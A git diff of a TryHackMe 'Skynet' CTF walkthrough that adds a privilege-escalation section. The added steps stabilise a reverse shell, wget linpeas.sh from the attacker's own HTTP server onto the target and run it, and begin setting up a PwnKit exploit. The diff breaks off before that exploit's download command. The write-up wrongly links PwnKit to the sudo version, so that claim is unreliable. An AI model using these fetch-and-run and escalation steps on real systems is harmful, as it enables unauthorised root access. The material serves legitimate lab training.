@@ -1,4 +1,4 @@
-<h1 align="center">TryHackMe Tutorial</h1>
+![image](https://github.com/w1r3dup/ctf_writeups/assets/153192531/4207ee12-0afe-49a5-a257-a7f9892da74b)<h1 align="center">TryHackMe Tutorial</h1>
 <h2 align="center">Skynet<br>Room link: https://tryhackme.com/room/skynet</h2>
 
 <h3 align="center">Dedicated to all the legends on our Discord channel - CyberSamurai</h3><br>
@@ -318,6 +318,8 @@ With no credentials for us to try, let's use ```searchsploit``` again and see if
 
 <p align="center"> <img src="./images/43.png"></p><br>
 
+<h1> Exploitation </h1>
+
 Let's see what it does. Print the contents of *25971.txt* on the terminal and analyse it thoroughly.<br>
 
 <p align="center"> <img src="./images/44.png"></p><br>
@@ -398,8 +400,91 @@ We are *www-data*<br>
 
 When you ```ls``` from the *home directory*, we notice that we can access Miles' folder. ```cd``` into that and you can ```cat``` out the *user.txt* flag.<br>
 
+<p align="center"> <img src="./images/50.png"></p><br>
 
+**That answers question 4 of the CTF.**
+<p align="center"> <img src="./images/51.png"></p><br>
 
+<p>Now, we need to see how to escalate our privileges to gain root access!</p>
+
+<h1> Privilege Escalation </h1>
+
+First, let's stabalise the shell. This is something I've learned in another CTF challenge called *Gallery*. It makes life easier as its easier to manage.<br>
+
+```bash
+export TERM=xterm
+
+which python3
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+Press CTRL + Z
+
+stty raw -echo ; fg
+
+reset
+```
+
+<p>This will give you a fully functional shell.</p>
+
+<p align="center"> <img src="./images/52.png"></p><br>
+
+Hit enter after ```reset``` and the output of the above will be like:<br>
+
+<p align="center"> <img src="./images/53.png"></p><br>
+
+As a common check to see what sudo privileges you have, we usually run the command ```sudo -l```, but as you can see from the below image, we need to provide the password of user www-data, which we do not have.<br>
+
+<p align="center"> <img src="./images/54.png"></p><br>
+
+So, let's cd over to */tmp* folder since that is usually a writable folder.<br>
+
+From here, open a new terminal and we will download **Linpeas** on our local machine. Linpeas scans the target for any vulnerabilites which could allow us to escalate our privileges.<br>
+*https://github.com/carlospolop/PEASS-ng/releases/tag/20231203-9cdcb38f*
+
+<p align="center"> <img src="./images/55.png"></p><br>
+
+When that is done, start a simple HTTP Server like we did previously. **Do not close the window**.<br>
+
+Go back to the shell window and run the below command so we dowload *linpeas.sh* onto the Skynet server.<br>
+
+```bash
+wget http://[yourIP]/linpeas.sh
+```
+*(the path may be different in your case, depending on where you launched the HTTP server).* <br>
+
+<p align="center"> <img src="./images/56.png"></p><br>
+
+<p>Let's make that executable.</p>
+
+```bash
+chmod +x linpeas.sh
+```
+
+<p align="center"> <img src="./images/57.png"></p><br>
+
+<p>Now run it and let it do it's work!</p>
+
+```bash
+./linpeas.sh
+```
+
+<p align="center"> <img src="./images/58.png"></p><br>
+
+The first thing I look for when I run linpeas is the **Sudo version** and it's vulnerabilities (if any).<br>
+
+In this case it's Sudo version **1.8.16**.<br>
+
+<p align="center"> <img src="./images/59.png"></p><br>
+
+From what I've learned before, this version of Sudo may be vulnerable to a PwnKit **CVE-2021-4034**.
+*https://github.com/berdav/CVE-2021-4034*
+
+<p>Let's test it out and see if this gives us root access.</p>
+
+Open a new terminal window and ```git clone``` the code from that link like I've shown before. Make sure it's in the same place where you have the HTTP Server running.<br>
+
+Go back to the shell window and download it using the below command:
 
 
 
